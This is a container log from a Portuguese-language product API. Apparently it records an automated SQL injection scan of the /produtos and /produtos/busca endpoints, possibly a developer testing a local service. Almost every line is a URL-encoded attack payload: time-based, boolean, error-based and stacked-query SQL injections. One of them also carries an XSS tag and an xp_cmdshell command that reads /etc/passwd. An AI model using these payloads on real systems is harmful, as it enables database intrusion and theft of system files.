api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F3660%3D%28SELECT%2F%2A%2A%2F3660%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3660%3D%28SELECT%2F%2A%2A%2F3660%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27mFQw%27%3D%27mFQw HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F3660%3D%28SELECT%2F%2A%2A%2F3660%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27mNvp%27%3D%27mNvp HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F3660%3D%28SELECT%2F%2A%2A%2F3660%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FNyLD HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%288872%3D8872 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27sqzv%27%3D%27sqzv HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27AQfN%27%3D%27AQfN HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FLojg HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F9507%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%2874%29%7C%7CCHR%2888%29%7C%7CCHR%28118%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284427%3D4427 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F9507%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%2874%29%7C%7CCHR%2888%29%7C%7CCHR%28118%29%2C5%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9507%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%2874%29%7C%7CCHR%2888%29%7C%7CCHR%28118%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27uBsI%27%3D%27uBsI HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F9507%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%2874%29%7C%7CCHR%2888%29%7C%7CCHR%28118%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27usPv%27%3D%27usPv HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F9507%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%2874%29%7C%7CCHR%2888%29%7C%7CCHR%28118%29%2C5%29--%2F%2A%2A%2FXtQv HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FzNxt HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FcmZw HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FtysG HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FuHDL HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FirZe HTTP/1.1
api-1  | 172.18.0.1 - POST /produtos HTTP/1.1
api-1  | 172.18.0.1 - POST /produtos?aygh=7346%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - POST /produtos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/1 HTTP/1.1
api-1  | 172.18.0.1 - PUT /produtos/1 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&WiCL=4967%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=8430 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27.%28.%29%22%28%2C%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27VMKmeH%3C%27%22%3EuCQhds HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9343%3D4617%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27dmns%27%3D%27dmns HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1924%3D1924%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27STQy%27%3D%27STQy HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7141%3D7746%2F%2A%2A%2FAND%2F%2A%2A%2F%27WhEG%27%3D%27WhEG HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1924%3D1924%2F%2A%2A%2FAND%2F%2A%2A%2F%27LPGM%27%3D%27LPGM HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F3549%3D8900%2F%2A%2A%2FAND%2F%2A%2A%2F%282112%3D2112 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1924%3D1924%2F%2A%2A%2FAND%2F%2A%2A%2F%287427%3D7427 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3120%3D5566 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1924%3D1924 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3548%3D2798--%2F%2A%2A%2FfhEp HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1924%3D1924--%2F%2A%2A%2FsVma HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283080%3D8477%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8477%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F7100%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289899%3D9899%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7333%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F5931%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288907%2CCONCAT%280x5c%2C0x716b707a71%2C%28SELECT%2F%2A%2A%2F%28ELT%288907%3D8907%2C1%29%29%29%2C0x7178627a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27fKoE%27%3D%27fKoE HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288907%2CCONCAT%280x5c%2C0x716b707a71%2C%28SELECT%2F%2A%2A%2F%28ELT%288907%3D8907%2C1%29%29%29%2C0x7178627a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27wsMt%27%3D%27wsMt HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288907%2CCONCAT%280x5c%2C0x716b707a71%2C%28SELECT%2F%2A%2A%2F%28ELT%288907%3D8907%2C1%29%29%29%2C0x7178627a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283984%3D3984 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288907%2CCONCAT%280x5c%2C0x716b707a71%2C%28SELECT%2F%2A%2A%2F%28ELT%288907%3D8907%2C1%29%29%29%2C0x7178627a71%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288907%2CCONCAT%280x5c%2C0x716b707a71%2C%28SELECT%2F%2A%2A%2F%28ELT%288907%3D8907%2C1%29%29%29%2C0x7178627a71%29%29--%2F%2A%2A%2FxGcw HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3459%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283459%3D3459%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27NEPM%27%3D%27NEPM HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F3459%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283459%3D3459%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27RYNv%27%3D%27RYNv HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F3459%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283459%3D3459%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288977%3D8977 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3459%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283459%3D3459%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3459%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283459%3D3459%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FDgbM HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F2453%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282453%3D2453%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27SHWk%27%3D%27SHWk HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F2453%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282453%3D2453%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27TvAT%27%3D%27TvAT HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F2453%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282453%3D2453%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282861%3D2861 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2453%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282453%3D2453%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2453%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282453%3D2453%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FPSdp HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5605%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285605%3D5605%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27TtUY%27%3D%27TtUY HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F5605%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285605%3D5605%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27FFfY%27%3D%27FFfY HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5605%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285605%3D5605%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289978%3D9978 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5605%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285605%3D5605%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5605%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285605%3D5605%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FSLNX HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qkpzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282039%3D2039%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qxbzq%27%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2876%29%7C%7CCHR%28118%29%7C%7CCHR%2880%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2876%29%7C%7CCHR%28118%29%7C%7CCHR%2880%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
